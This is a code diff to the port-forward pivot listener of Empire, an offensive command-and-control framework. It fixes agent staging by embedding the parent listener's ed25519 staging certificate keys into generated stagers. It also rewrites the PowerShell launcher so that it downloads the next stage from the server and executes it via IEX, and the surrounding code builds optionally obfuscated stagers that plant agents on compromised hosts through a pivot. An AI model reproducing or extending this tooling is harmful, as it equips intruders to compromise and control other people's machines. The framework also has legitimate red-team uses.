@@ -8,6 +8,8 @@ import secrets
 import time
 from urllib.parse import urlparse
 
+from cryptography.hazmat.primitives import serialization
+
 from empire.server.common import helpers, packets, templating
 from empire.server.common.empire import MainMenu
 from empire.server.core.db import models
@@ -27,6 +29,18 @@ _LISTEN_FAIL_SENTINEL = "[port_forward_pivot] LISTEN_FAIL"
 # edges, 1..63 chars. We validate per-label rather than against the full
 # string to keep the regex readable.
 _HOSTNAME_LABEL = re.compile(r"^(?!-)[A-Za-z0-9-]{1,63}(?<!-)$")
+
+# Attributes an http-family listener exposes for staging key negotiation. The
+# pivot has none of its own; it borrows the parent listener's (see
+# _staging_cert_key_options). A parent lacking these (smb, http_foreign,
+# http_hop, another pivot) cannot back a port_forward_pivot.
+_PARENT_STAGING_KEY_ATTRS = (
+    "agent_private_cert_key_object",
+    "server_private_cert_key_object",
+    "agent_private_cert_key",
+    "agent_public_cert_key",
+    "server_public_cert_key",
+)
 
 
 def _validate_host(host, field_name: str) -> str:
@@ -94,6 +108,11 @@ class Listener:
     def post_init(self):
         self.host_address = None
         self._relay_task_id = None
+        # Name of the listener the pivoted agent is homed on. Set in start().
+        # generate_stager() needs it to resolve the parent listener's staging
+        # certificate keys — stage 2 is validated against the parent's keys,
+        # not the pivot's (the pivot has none of its own).
+        self.parent_listener_name = None
 
         self.instance_log = log
 
@@ -226,10 +245,10 @@ class Listener:
 
             stager += f'$wc.Headers.Add("Cookie","session={b64RoutingPacket}");'
             stager += "$data=$wc.DownloadData($ser+$t);"
-            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
 
-            # decode everything and kick it over to IEX to kick off execution
-            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+            # The http listener returns the stage as plaintext (not RC4), so
+            # IEX it directly — matches empire/server/listeners/http/listener.py.
+            stager += "IEX ([Text.Encoding]::UTF8.GetString($data))"
 
             # Remove comments and make one line
             stager = helpers.strip_powershell_comments(stager)
@@ -389,6 +408,87 @@ class Listener:
         )
         return None
 
+    def _staging_cert_key_options(self, language):
+        """Resolve the parent listener this pivot relays through and return the
+        ed25519 staging certificate keys the http stage-1 templates require.
+
+        These MUST come from the parent listener: the new agent's stage-2 POST
+        is handled by the parent http listener, which signs and validates
+        staging with its OWN keys (agent_public_cert_key verifies the agent's
+        cert; server_private_cert_key signs the server response — see
+        http/listener.py handle_post). If the stage-1 stager is baked with
+        anything else — or, as before this fix, with nothing at all — the
+        agent's server-cert check fails and it never requests stage 2. Returns
+        None (and logs) if the parent isn't active.
+        """
+        if self.parent_listener_name is None:
+            log.error(
+                "listeners/port_forward_pivot generate_stager(): called before "
+                "start(); parent_listener_name is unset, cannot resolve staging "
+                "certificate keys"
+            )
+            return None
+
+        parent = self.mainMenu.listenersv2.get_active_listener_by_name(
+            self.parent_listener_name
+        )
+        if parent is None:
+            log.error(
+                "listeners/port_forward_pivot generate_stager(): parent listener "
+                f"{self.parent_listener_name!r} is not active; cannot embed "
+                "staging certificate keys"
+            )
+            return None
+
+        # start() rejects parents that lack these, but guard here too: a stale
+        # or non-http-family parent instance would otherwise raise an opaque
+        # AttributeError that surfaces to the agent as a bare HTTP 500.
+        missing = [
+            attr for attr in _PARENT_STAGING_KEY_ATTRS if not hasattr(parent, attr)
+        ]
+        if missing:
+            log.error(
+                "listeners/port_forward_pivot generate_stager(): parent listener "
+                f"{self.parent_listener_name!r} (type {type(parent).__module__}) "
+                f"does not provide staging keys {missing}; port_forward_pivot "
+                "requires an http/http_malleable parent"
+            )
+            return None
+
+        if language.lower() == "powershell":
+            private_bytes = parent.agent_private_cert_key_object.private_bytes(
+                encoding=serialization.Encoding.Raw,
+                format=serialization.PrivateFormat.Raw,
+                encryption_algorithm=serialization.NoEncryption(),
+            )
+            agent_public_bytes = (
+                parent.agent_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            server_public_bytes = (
+                parent.server_private_cert_key_object.public_key().public_bytes(
+                    encoding=serialization.Encoding.Raw,
+                    format=serialization.PublicFormat.Raw,
+                )
+            )
+            return {
+                "agent_private_cert_key": ",".join(f"0x{b:02x}" for b in private_bytes),
+                "agent_public_cert_key": ",".join(
+                    f"0x{b:02x}" for b in agent_public_bytes
+                ),
+                "server_public_cert_key": ",".join(
+                    f"0x{b:02x}" for b in server_public_bytes
+                ),
+            }
+
+        return {
+            "agent_private_cert_key": parent.agent_private_cert_key,
+            "agent_public_cert_key": parent.agent_public_cert_key,
+            "server_public_cert_key": parent.server_public_cert_key,
+        }
+
     def generate_stager(
         self,
         listenerOptions,
@@ -424,6 +524,10 @@ class Listener:
                 self.mainMenu.install_path / "listeners",
             ]
 
+            cert_key_options = self._staging_cert_key_options(language)
+            if cert_key_options is None:
+                return None
+
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/http.ps1.j2")
 
@@ -432,10 +536,11 @@ class Listener:
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "profile": profile,
-                "session_cookie": self.session_cookie,
+                "session_cookie": listenerOptions["Cookie"]["Value"],
                 "host": host,
                 "stage_1": stage1,
                 "stage_2": stage2,
+                **cert_key_options,
             }
             stager = template.render(template_options)
 
@@ -451,9 +556,6 @@ class Listener:
                 stager = stager.replace(
                     '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
-
-            stagingKey = stagingKey.encode("UTF-8")
-            stager = listener_util.remove_lines_comments(stager)
 
             if obfuscate:
                 stager = self.mainMenu.obfuscationv2.obfuscate(
@@ -472,6 +574,10 @@ class Listener:
                 self.mainMenu.install_path / "listeners",
             ]
 
+            cert_key_options = self._staging_cert_key_options(language)
+            if cert_key_options is None:
+                return None
+
             eng = templating.TemplateEngine(template_path)
             template = eng.get_template("http/http.py.j2")
 
@@ -480,10 +586,11 @@ class Listener:
                 "kill_date": killDate,
                 "staging_key": stagingKey,
                 "profile": profile,
-                "session_cookie": self.session_cookie,
+                "session_cookie": listenerOptions["Cookie"]["Value"],
                 "host": host,
                 "stage_1": stage1,
                 "stage_2": stage2,
+                **cert_key_options,
             }
             stager = template.render(template_options)
 
@@ -630,7 +737,7 @@ class Listener:
             template = eng.get_template("http/http.ps1.j2")
 
             template_options = {
-                "session_cookie": self.session_cookie,
+                "session_cookie": listenerOptions["Cookie"]["Value"],
                 "host": self.host_address,
             }
 
@@ -644,7 +751,7 @@ class Listener:
             template = eng.get_template("http/comms.py.j2")
 
             template_options = {
-                "session_cookie": self.session_cookie,
+                "session_cookie": listenerOptions["Cookie"]["Value"],
                 "host": self.host_address,
             }
 
@@ -693,15 +800,38 @@ class Listener:
                     for k in ("Agent", "internalIP", "ListenPort"):
                         if k in tempOptions:
                             self.options[k] = copy.deepcopy(tempOptions[k])
+                    # Remember the parent so generate_stager() can pull its
+                    # staging certificate keys (see post_init note).
+                    self.parent_listener_name = listenerName
                 else:
                     log.error("Parent listener not found")
                     return False
 
                 # validate that the Listener does exist
-                if not self.mainMenu.listenersv2.get_active_listener_by_name(
+                active_parent = self.mainMenu.listenersv2.get_active_listener_by_name(
                     listenerName
-                ):
+                )
+                if not active_parent:
                     log.error(f"{listenerName}: Listener does not exist")
+                    return False
+
+                # The pivot borrows the parent's staging certificate keys at
+                # stage-1 time. Reject a parent that can't provide them now, while
+                # the operator is watching, rather than failing later with an
+                # opaque HTTP 500 when the pivoted agent tries to stage.
+                missing = [
+                    attr
+                    for attr in _PARENT_STAGING_KEY_ATTRS
+                    if not hasattr(active_parent, attr)
+                ]
+                if missing:
+                    log.error(
+                        f"{listenerName}: parent listener (type "
+                        f"{type(active_parent).__module__}) does not provide staging "
+                        f"keys {missing}; port_forward_pivot requires an "
+                        "http/http_malleable parent. Re-home the agent or choose a "
+                        "different parent listener."
+                    )
                     return False
 
                 # check if a listener for the agent already exists
@@ -732,6 +862,7 @@ class Listener:
                 except ValueError:
                     log.exception(f"{listenerName}: invalid listener config")
                     return False
+
                 language = agent.language.lower()
 
                 if language in ("powershell", "csharp", "go"):
